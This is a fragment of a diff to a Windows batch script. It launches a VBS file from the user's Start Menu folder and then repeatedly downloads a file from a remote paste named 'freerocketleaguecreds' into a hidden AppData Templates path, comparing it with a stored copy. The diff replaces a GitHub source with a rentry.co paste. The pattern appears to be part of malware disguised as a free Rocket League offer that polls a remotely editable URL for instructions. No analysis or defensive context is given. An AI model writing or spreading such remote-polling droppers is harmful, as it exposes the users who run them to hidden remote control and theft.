@@ -13,7 +13,7 @@
 start C:\Users\%username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\3.vbs
 :main
 timeout 1
-curl https://raw.githubusercontent.com/vrs1104/rocket-league/main/freerocketleague > C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Templates\1.txt
+curl https://rentry.co/freerocketleaguecreds/raw > C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Templates\1.txt
 if errorlevel 1 goto shit
 fc C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Templates\1.txt C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Templates\2.tmp > nul
 if errorlevel 1 goto error
